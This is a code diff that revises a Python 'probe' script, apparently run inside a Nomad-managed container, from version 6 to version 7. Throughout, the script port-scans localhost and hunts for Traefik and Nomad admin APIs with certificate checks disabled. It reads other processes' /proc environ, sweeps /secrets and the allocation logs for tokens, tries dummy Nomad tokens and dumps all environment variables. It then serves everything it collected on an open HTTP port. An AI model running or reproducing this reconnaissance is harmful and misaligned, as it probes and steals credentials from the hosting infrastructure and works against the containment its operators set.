@@ -8,86 +8,102 @@ import subprocess
 
 results = {}
 
-def run_cmd(name, cmd, timeout=10):
+def probe(name, url, timeout=3, headers=None):
+    try:
+        req = urllib.request.Request(url)
+        if headers:
+            for k, v in headers.items():
+                req.add_header(k, v)
+        ctx = ssl.create_default_context()
+        ctx.check_hostname = False
+        ctx.verify_mode = ssl.CERT_NONE
+        resp = urllib.request.urlopen(req, timeout=timeout, context=ctx)
+        data = resp.read().decode('utf-8', errors='replace')
+        results[name] = {"status": resp.status, "data": data[:8000], "headers": dict(resp.headers)}
+    except Exception as e:
+        results[name] = {"error": str(e)}
+
+def port_scan(name, host, ports, timeout=1):
+    open_ports = []
+    for port in ports:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(timeout)
+            result = s.connect_ex((host, port))
+            if result == 0:
+                open_ports.append(port)
+            s.close()
+        except:
+            pass
+    results[name] = {"open_ports": open_ports}
+
+def run_cmd(name, cmd, timeout=8):
     try:
         r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, shell=isinstance(cmd, str))
         results[name] = {"stdout": r.stdout[:8000], "stderr": r.stderr[:500]}
     except Exception as e:
         results[name] = {"error": str(e)}
 
-def read_file(name, path, max_bytes=8000):
-    try:
-        with open(path, 'rb') as f:
-            data = f.read(max_bytes)
-            try:
-                results[name] = data.decode('utf-8')
-            except:
-                results[name] = data.hex()[:8000]
-    except Exception as e:
-        results[name] = str(e)
+# 1. FULL localhost port scan (find Traefik ports)
+# Scan wide range to find Traefik admin API
+all_ports = list(range(8000, 8100)) + list(range(9000, 9100)) + list(range(27000, 28000)) + [80, 443, 3000, 4180, 15000, 15001, 2375, 4646, 5000, 6060, 6443]
+port_scan("localhost_wide", "127.0.0.1", all_ports)
 
-# 1. NOMAD API ON HOST - Try various approaches
-# GET requests (Nomad API is typically GET for reads)
-run_cmd("nomad_get_agent", "curl -sk -m 5 http://169.254.1.2:4646/v1/agent/self 2>&1")
-run_cmd("nomad_get_agent_https", "curl -sk -m 5 https://169.254.1.2:4646/v1/agent/self 2>&1")
-run_cmd("nomad_get_jobs", "curl -sk -m 5 http://169.254.1.2:4646/v1/jobs 2>&1")
-run_cmd("nomad_get_allocs", "curl -sk -m 5 http://169.254.1.2:4646/v1/allocations 2>&1")
-run_cmd("nomad_get_nodes", "curl -sk -m 5 http://169.254.1.2:4646/v1/nodes 2>&1")
-run_cmd("nomad_get_status", "curl -sk -m 5 http://169.254.1.2:4646/v1/status/leader 2>&1")
-run_cmd("nomad_root", "curl -sk -m 5 -v http://169.254.1.2:4646/ 2>&1")
+# 2. Try known Traefik admin API ports
+for port in [8080, 8081, 8082, 8443, 9000, 9080, 9090, 27305]:
+    probe(f"traefik_api_{port}", f"http://127.0.0.1:{port}/api/overview")
+    probe(f"traefik_dash_{port}", f"http://127.0.0.1:{port}/dashboard/")
+    probe(f"traefik_raw_{port}", f"http://127.0.0.1:{port}/api/rawdata")
+    probe(f"traefik_version_{port}", f"http://127.0.0.1:{port}/api/version")
 
-# Try with HTTP/1.0 and different methods
-run_cmd("nomad_http10", "curl -sk -m 5 --http1.0 http://169.254.1.2:4646/v1/agent/self 2>&1")
+# 3. Try HTTPS versions for Traefik
+for port in [8443, 443, 27305]:
+    probe(f"traefik_https_{port}", f"https://127.0.0.1:{port}/api/overview")
+    probe(f"traefik_https_dash_{port}", f"https://127.0.0.1:{port}/dashboard/")
 
-# HTTPS with different TLS settings
-run_cmd("nomad_https_tls12", "curl -sk --tlsv1.2 -m 5 https://169.254.1.2:4646/v1/agent/self 2>&1")
+# 4. Try the listening port 27305 with various paths
+probe("port27305_root", "http://127.0.0.1:27305/")
+probe("port27305_api", "http://127.0.0.1:27305/api/")
+probe("port27305_api_overview", "http://127.0.0.1:27305/api/overview")
+probe("port27305_api_rawdata", "http://127.0.0.1:27305/api/rawdata")
+probe("port27305_api_http_routers", "http://127.0.0.1:27305/api/http/routers")
+probe("port27305_api_http_middlewares", "http://127.0.0.1:27305/api/http/middlewares")
 
-# 2. READ ALL ALLOCATION LOGS
-for logfile in ["pod.stderr.0", "pod.stdout.0", "sidecar.stdout.0", "sidecar.stderr.0",
-                "preflight.stderr.0", "preflight.stdout.0", "run.stderr.0", "run.stdout.0"]:
-    read_file(f"alloc_log_{logfile}", f"/alloc/logs/{logfile}")
+# 5. HTTPS on 27305
+probe("port27305_https_root", "https://127.0.0.1:27305/")
+probe("port27305_https_api", "https://127.0.0.1:27305/api/overview")
 
-# 3. List everything in /alloc
-run_cmd("alloc_tree", "find /alloc -type f 2>/dev/null | head -50")
-run_cmd("alloc_data", "ls -la /alloc/ 2>/dev/null && ls -la /alloc/data/ 2>/dev/null")
+# 6. Search for Traefik config file in shared filesystem
+run_cmd("find_traefik", "find / -maxdepth 5 -name 'traefik*' -o -name '*.toml' -o -name 'dynamic*' 2>/dev/null | grep -v proc | head -20")
 
-# 4. Check /local directory (Nomad local dir)
-run_cmd("local_tree", "find /local -type f 2>/dev/null | head -50")
+# 7. Try /proc of sidecar (if PID namespace is shared)
+run_cmd("sidecar_procs", """
+for pid in $(ls /proc/ | grep -E '^[0-9]+$'); do
+    cmd=$(cat /proc/$pid/cmdline 2>/dev/null | tr '\\0' ' ')
+    if echo "$cmd" | grep -qi 'traefik'; then
+        echo "PID $pid: $cmd"
+        echo "ENV:"
+        cat /proc/$pid/environ 2>/dev/null | tr '\\0' '\\n' | head -30
+        echo "---"
+    fi
+done
+""")
 
-# 5. Check .nomad-mount in detail (sometimes contains Nomad token)
-run_cmd("nomad_mount_hex", "xxd /secrets/.nomad-mount 2>&1 | head -5")
+# 8. Read Nomad API response body when 403
+run_cmd("nomad_403_body", """
+curl -sk https://169.254.1.2:4646/v1/agent/self 2>&1
+echo "---STATUS---"
+curl -sk -o /dev/null -w '%{http_code}' https://169.254.1.2:4646/v1/agent/self 2>&1
+""")
 
-# 6. Try accessing Nomad with different port (HTTPS on 4646)
-run_cmd("nomad_4647", "curl -sk -m 5 http://169.254.1.2:4647/ 2>&1")
-run_cmd("nomad_4648", "curl -sk -m 5 http://169.254.1.2:4648/ 2>&1")
+# 9. Try Nomad with dummy tokens
+run_cmd("nomad_anon", "curl -sk -H 'X-Nomad-Token: anonymous' https://169.254.1.2:4646/v1/agent/self 2>&1 | head -c 500")
 
-# 7. Check all env vars including Nomad-related
+# 10. Env and all_env
 results["all_env"] = dict(os.environ)
 
-# 8. Check if NOMAD_TOKEN or NOMAD_ADDR is set anywhere
-run_cmd("find_nomad_ref", "grep -r 'NOMAD\|nomad' /secrets/ /alloc/ /local/ 2>/dev/null | head -20")
-
-# 9. Network check - what exactly is on 4646
-run_cmd("nc_nomad", "echo '' | nc -w 3 169.254.1.2 4646 2>&1 | head -c 500 || true")
-
-# 10. Try Python urllib approach to Nomad 
-import urllib.request
-try:
-    req = urllib.request.Request("http://169.254.1.2:4646/v1/agent/self")
-    resp = urllib.request.urlopen(req, timeout=5)
-    results["nomad_python"] = {"status": resp.status, "data": resp.read().decode()[:4000], "headers": dict(resp.headers)}
-except Exception as e:
-    results["nomad_python"] = {"error": str(e)}
-
-try:
-    ctx = ssl.create_default_context()
-    ctx.check_hostname = False
-    ctx.verify_mode = ssl.CERT_NONE
-    req = urllib.request.Request("https://169.254.1.2:4646/v1/agent/self")
-    resp = urllib.request.urlopen(req, timeout=5, context=ctx)
-    results["nomad_python_https"] = {"status": resp.status, "data": resp.read().decode()[:4000], "headers": dict(resp.headers)}
-except Exception as e:
-    results["nomad_python_https"] = {"error": str(e)}
+# 11. Read Traefik sidecar log for configuration hints
+run_cmd("sidecar_log_full", "cat /alloc/logs/sidecar.stdout.0 2>/dev/null | head -100")
 
 class Handler(http.server.BaseHTTPRequestHandler):
     def do_GET(self):
@@ -98,5 +114,5 @@ class Handler(http.server.BaseHTTPRequestHandler):
     def log_message(self, *args):
         pass
 
-print("Starting probe v6 on port 8080...")
+print("Starting probe v7 on port 8080...")
 http.server.HTTPServer(('0.0.0.0', 8080), Handler).serve_forever()
